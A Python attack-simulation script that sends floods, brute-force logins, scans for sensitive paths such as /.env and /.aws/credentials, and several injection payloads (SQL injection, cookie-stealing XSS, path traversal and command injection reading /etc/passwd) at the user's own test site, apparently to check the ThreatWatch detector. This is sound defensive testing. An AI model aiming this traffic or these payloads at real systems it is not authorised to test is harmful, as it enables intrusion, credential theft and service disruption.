"""Attack simulator — drives real HTTP traffic at a website you control.

This makes ordinary HTTP requests against your own test site (the included
Northwind sample, or any site you own). The site's monitoring agent forwards the
request metadata to ThreatWatch, which detects the attack. Nothing here talks to
the detector directly — it exercises the real monitoring path end to end.

    python simulate_attack.py --target https://your-site.vercel.app --scenario all

Only point this at a site you are authorised to test.
"""
from __future__ import annotations

import argparse
import random
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests

UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0"
UA_BOT = "python-requests/2.31 threatwatch-sim"

SENSITIVE = ["/.env", "/.git/config", "/wp-login.php", "/wp-admin", "/phpmyadmin",
             "/.aws/credentials", "/config.json", "/actuator/health", "/server-status"]

INJECTION = [
    ("/products", "q=widget' UNION SELECT username,password FROM users--"),
    ("/products", "id=1 OR 1=1"),
    ("/search", "x=<script>alert(document.cookie)</script>"),
    ("/item", "file=../../../../etc/passwd"),
    ("/item", "p=php://filter/convert.base64-encode/resource=index"),
    ("/run", "cmd=;cat /etc/passwd"),
]


def _xff() -> dict:
    """A random-ish source IP. Honoured by `next dev` locally; Vercel overrides it in prod."""
    return {"X-Forwarded-For": f"203.0.113.{random.randint(2, 250)}"}


class Sim:
    def __init__(self, target: str, spoof: bool):
        self.target = target.rstrip("/")
        self.spoof = spoof
        self.sess = requests.Session()
        self.sent = 0
        self.errors = 0

    def _hdr(self, ua: str) -> dict:
        h = {"User-Agent": ua}
        if self.spoof:
            h.update(_xff())
        return h

    def get(self, path: str, ua: str = UA_BROWSER) -> None:
        try:
            r = self.sess.get(self.target + path, headers=self._hdr(ua), timeout=10)
            self.sent += 1
            if r.status_code >= 400:
                self.errors += 1
        except requests.RequestException:
            self.errors += 1

    def post(self, path: str, body: dict, ua: str = UA_BOT) -> None:
        try:
            self.sess.post(self.target + path, json=body, headers=self._hdr(ua), timeout=10)
            self.sent += 1
        except requests.RequestException:
            self.errors += 1

    # ---- scenarios ------------------------------------------------------
    def flood(self, count: int, rps: float) -> None:
        print(f"  flood: {count} rapid requests")
        delay = 1.0 / rps if rps > 0 else 0
        paths = ["/", "/products", "/api/products"]
        with ThreadPoolExecutor(max_workers=20) as ex:
            for i in range(count):
                ex.submit(self.get, random.choice(paths))
                if delay:
                    time.sleep(delay)

    def bruteforce(self, count: int) -> None:
        print(f"  brute force: {count} bad logins (expect 401s)")
        for i in range(count):
            self.post("/api/login", {"username": "admin", "password": f"guess{i}"})

    def scan(self) -> None:
        print(f"  path scan: {len(SENSITIVE)} sensitive + 40 random paths")
        for p in SENSITIVE:
            self.get(p, ua=UA_BOT)
        for _ in range(40):
            rnd = "".join(random.choices(string.ascii_lowercase, k=6))
            self.get(f"/admin/{rnd}", ua=UA_BOT)

    def inject(self) -> None:
        print(f"  injection: {len(INJECTION)} payloads x3")
        for _ in range(3):
            for path, q in INJECTION:
                self.get(f"{path}?{q}", ua=UA_BOT)

    def beacon(self, count: int, interval: float) -> None:
        print(f"  beacon: {count} check-ins every {interval}s (regular, automated)")
        for i in range(count):
            self.get("/api/products", ua=UA_BOT)
            if i < count - 1:
                time.sleep(interval)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True, help="Base URL of the site to test (you must own it)")
    ap.add_argument("--scenario", default="all",
                    choices=["all", "flood", "bruteforce", "scan", "inject", "beacon"])
    ap.add_argument("--count", type=int, default=160, help="requests for flood/bruteforce")
    ap.add_argument("--rps", type=float, default=40, help="target requests/sec for flood")
    ap.add_argument("--beacon-count", type=int, default=16)
    ap.add_argument("--beacon-interval", type=float, default=8.0)
    ap.add_argument("--spoof-ip", action="store_true",
                    help="vary X-Forwarded-For (works against `next dev` locally; ignored by Vercel in prod)")
    args = ap.parse_args(argv)

    sim = Sim(args.target, args.spoof_ip)
    print(f"Target: {sim.target}   scenario: {args.scenario}"
          + ("   (spoofing source IPs)" if args.spoof_ip else ""))
    t0 = time.time()
    try:
        if args.scenario in ("all", "flood"):
            sim.flood(args.count, args.rps)
        if args.scenario in ("all", "bruteforce"):
            sim.bruteforce(args.count)
        if args.scenario in ("all", "scan"):
            sim.scan()
        if args.scenario in ("all", "inject"):
            sim.inject()
        if args.scenario in ("all", "beacon"):
            sim.beacon(args.beacon_count, args.beacon_interval)
    except KeyboardInterrupt:
        print("\ninterrupted")
    dt = time.time() - t0
    print(f"\nDone: {sim.sent} requests sent, {sim.errors} errors, in {dt:.1f}s.")
    print("Open the ThreatWatch dashboard — alerts should be appearing now.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
